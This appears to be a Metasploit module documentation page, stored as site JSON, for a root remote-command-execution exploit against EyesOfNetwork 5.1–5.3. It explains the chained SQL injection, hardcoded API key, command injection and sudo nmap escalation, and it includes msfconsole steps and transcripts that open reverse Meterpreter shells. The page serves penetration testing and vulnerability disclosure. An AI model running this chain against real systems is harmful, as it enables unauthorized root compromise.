{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/eyesofnetwork_autodiscovery_rce","result":{"data":{"moduleMetadataJson":{"id":"fd8785e9-1432-510c-bb2e-c0e70a470b97","name":"EyesOfNetwork 5.1-5.3 AutoDiscovery Target Command Execution","fullname":"exploit/linux/http/eyesofnetwork_autodiscovery_rce","description":"This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2\n        and 5.3 in order to execute arbitrary commands as root.\n\n        This module takes advantage of a command injection vulnerability in the\n        `target` parameter of the AutoDiscovery functionality within the EON web\n        interface in order to write an Nmap NSE script containing the payload to\n        disk. It then starts an Nmap scan to activate the payload. This results in\n        privilege escalation because the`apache` user can execute Nmap as root.\n\n        Valid credentials for a user with administrative privileges are required.\n        However, this module can bypass authentication via various methods, depending on\n        the EON version. EON 5.3 is vulnerable to a hardcoded API key and two SQL\n        injection exploits. EON 5.1 and 5.2 can only be exploited via SQL injection.\n        This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/eyesofnetwork_autodiscovery_rce","documentationSlug":"/modules/documentation/exploit/linux/http/eyesofnetwork_autodiscovery_rce","referencesSlug":"/modules/references/exploit/linux/http/eyesofnetwork_autodiscovery_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2 and 5.3 in order to execute arbitrary\ncommands as root.</p>\n<p>The module first runs a few checks to verify the EyesOfNetwork version. If version 5.1 or 5.2 is detected, it attempts\nan authentication bypass via an SQL injection in the <code class=\"language-text\">user_id</code> field in a cookie (CVE-2020-9465). If version 5.3 is\ndetected, the module exploits a hardcoded admin API key in EyesOfNetwork API version 2.4.2 (CVE-2020-8657) in order to\ngenerate a valid access token and uses it to create a new user with admin privileges. If the generated key is not valid,\nthe admin API key is obtained via an SQL injection vulnerability affecting the same API version (CVE-2020-8656). If this\ndoesn't work either, it attempts CVE-2020-9465, which is the slowest and most noisy exploit of the three.</p>\n<p>For all vulnerable versions, the next step after bypassing authentication is to abuse a command injection vulnerability\nin the <code class=\"language-text\">target</code> parameter of the AutoDiscovery functionality within the EON web interface (CVE-2020-8654). Specifically,\nthe module writes an Nmap NSE script containing the payload to disk, and then activates this script by launching an Nmap\nhost discovery scan against the target. This achieves privilege escalation because the default sudo configuration\npermits the 'apache' user to execute Nmap as root (CVE-2020-8655).</p>\n<p>The module only works with HTTPS, so SSL is enabled by default. Valid credentials for a user with administrative\nprivileges are required. However, as explained above, the module can bypass authentication via various methods,\ndepending on the EON version. This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the module as usual</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/eyesofnetwork_autodiscovery_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set payload [payload]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"server_addr\" style=\"position:relative;\"><a href=\"#server_addr\" aria-label=\"server_addr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SERVER_ADDR</h3>\n<p>This option should be set for EON version 5.3 in case the EyesOfNetwork server IP address is different from <code class=\"language-text\">RHOST</code>.\nThis because the EON server IP is needed to generate the API key.</p>\n<h3 id=\"sqli_sleep\" style=\"position:relative;\"><a href=\"#sqli_sleep\" aria-label=\"sqli_sleep permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLI_SLEEP</h3>\n<p>The sleep value to be used when attempting to exploit CVE-2020-9465, which uses sleep-based SQL injection. The default\nvalue is 1.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<ol>\n<li>EyesOfNetwork version 5.1</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/eyesofnetwork_autodiscovery_rce) &gt; show options\n\nModule options (exploit/linux/http/eyesofnetwork_autodiscovery_rce):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS       192.168.1.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT        443              yes       The target port (TCP)\n   SERVER_ADDR                   yes       EyesOfNetwork server IP address (if different from RHOST)\n   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT      8080             yes       The local port to listen on.\n   SSL          true             no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI    /                yes       Base path to EyesOfNetwork\n   URIPATH                       no        The URI to use for this exploit (default is random)\n   VHOST                         no        HTTP server virtual host\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   1   Linux (x64)\n\n\nmsf5 exploit(linux/http/eyesofnetwork_autodiscovery_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Target is EyesOfNetwork version 5.1. Attempting exploitation using CVE-2020-9465.\n[+] The target seems vulnerable.\n[*] Verified that the admin user has at least one active session.\n[*] Found the admin &#39;session_id&#39; size: 31\n[*] Calculating the admin &#39;session_id&#39; value. This will take a while...\n[+] Obtained admin &#39;session_id&#39; value: 1856115646\n[*] Command Stager progress - 100.00% done (897/897 bytes)\n[*] Sending stage (3012516 bytes) to 192.168.1.1\n[*] Meterpreter session 1 opened (192.168.91.2:4444 -&gt; 192.168.1.1:55744) at 2020-05-19 08:48:37 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"2\">\n<li>EyesOfNetwork version 5.2</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/eyesofnetwork_autodiscovery_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Target is EyesOfNetwork version 5.2. Attempting exploitation using CVE-2020-9465.\n[+] The target seems vulnerable.\n[*] Verified that the admin user has at least one active session.\n[*] Found the admin &#39;session_id&#39; size: 31\n[*] Calculating the admin &#39;session_id&#39; value. This will take a while...\n[+] Obtained admin &#39;session_id&#39; value: 1445224287\n[*] Command Stager progress - 100.00% done (897/897 bytes)\n[*] Sending stage (3012516 bytes) to 192.168.1.3\n[*] Meterpreter session 2 opened (192.168.1.2:4444 -&gt; 192.168.1.3:38070) at 2020-05-19 08:49:46 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"3\">\n<li>EyesOfNetwork version 5.3</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/eyesofnetwork_autodiscovery_rce) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.\n[*] Using generated API key: a926605f4e617fd68bbb86112156b41ea2406503859dad58b0d0aefcc848b755\n[+] Authenticated as user r6veXwtZ2zh\n[*] Command Stager progress - 100.00% done (897/897 bytes)\n[*] Sending stage (3012516 bytes) to 192.168.1.4\n[*] Meterpreter session 3 opened (192.168.1.2:4444 -&gt; 192.168.1.4:60244) at 2020-05-19 08:50:04 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://www.exploit-db.com/exploits/48025\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/48025</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8654\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2020-8654</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8655\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2020-8655</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8656\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2020-8656</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8657\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2020-8657</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-9465\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://nvd.nist.gov/vuln/detail/CVE-2020-9465</a></li>\n</ol>"}}},"pageContext":{"id":"fd8785e9-1432-510c-bb2e-c0e70a470b97"}}}